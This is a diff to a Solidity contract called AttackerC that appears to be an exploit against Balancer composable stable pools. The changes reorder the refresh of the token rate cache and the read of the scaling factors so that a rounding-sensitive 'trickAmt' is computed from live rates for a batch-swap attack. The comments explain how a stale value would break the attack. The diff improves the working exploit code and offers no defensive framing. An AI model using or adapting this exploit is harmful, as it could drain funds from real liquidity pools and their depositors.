@@ -351,10 +351,13 @@ contract AttackerC {
             IERC20(address(tokens[i])).approve(balancer, type(uint256).max);
         }
 
-        uint256[] memory scalingFactors = IComposableStablePool(pool).getScalingFactors(); 
         uint256 idx = helper.get_index(tokens, startBalances, BptIndex);
+        // Refresh the token rate cache BEFORE reading scalingFactors so that
+        // sf[idx] reflects the live oracle rate instead of the stale cached value.
+        // trickAmt = floor(1e18 / (sf - 1e18)) is sensitive to sf at the integer
+        // boundary; using a stale sf could yield a wrong trickAmt and cause NR divergence.
         IComposableStablePool(pool).updateTokenRateCache(tokens[idx]);
-        uint256 trickAmt = helper.get_trickAmt(scalingFactors[idx]);
+        uint256[] memory scalingFactors = IComposableStablePool(pool).getScalingFactors();
         uint256 indexIn = 0;
         uint256 indexOut = 2;
         
@@ -369,12 +372,13 @@ contract AttackerC {
             tokenIndexOut = 0; 
         }
 
-        (uint256 amplificationParameter, bool isUpdating, uint256 precision) = IComposableStablePool(pool).getAmplificationParameter(); 
+        uint256 trickAmt = helper.get_trickAmt(scalingFactors[idx]);
+        (uint256 amplificationParameter, bool isUpdating, uint256 precision) = IComposableStablePool(pool).getAmplificationParameter();
         uint256 swapFeePercentage = IComposableStablePool(pool).getSwapFeePercentage();
-        uint256 rate = IComposableStablePool(pool).getRate(); 
+        // pool.getRate() returns BPT price (invariant/actualSupply), NOT the token
+        // oracle rate, and is never used in the attack math — removed dead variable.
         (, uint256[] memory balances, uint256 lastChangeBlock) = IBalancerVault(balancer).getPoolTokens(poolId);
-        uint256 actualSupply = IComposableStablePool(pool).getActualSupply(); 
-        scalingFactors = IComposableStablePool(pool).getScalingFactors(); 
+        uint256 actualSupply = IComposableStablePool(pool).getActualSupply();
 
         IBalancerVault.BatchSwapStep[] memory phase1steps = prepare_phase1_steps(
             poolId,
